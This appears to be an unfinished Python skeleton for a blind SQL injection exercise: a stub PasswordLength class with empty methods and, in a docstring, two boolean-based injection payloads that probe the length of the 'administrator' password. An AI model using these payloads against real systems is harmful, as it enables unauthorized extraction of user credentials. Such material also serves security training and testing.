import requests


'''
' and (select username from users where LENGTH(password) > {self.__LENGTH})='administrator'-- -
' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'-- -
'''


class PasswordLength:
    __LENGTH = None
    
    def __init__(self):
        self.__LENGTH = 0
    
    def make_request(self):
        pass
    

if __name__ == '__main__':
    pass
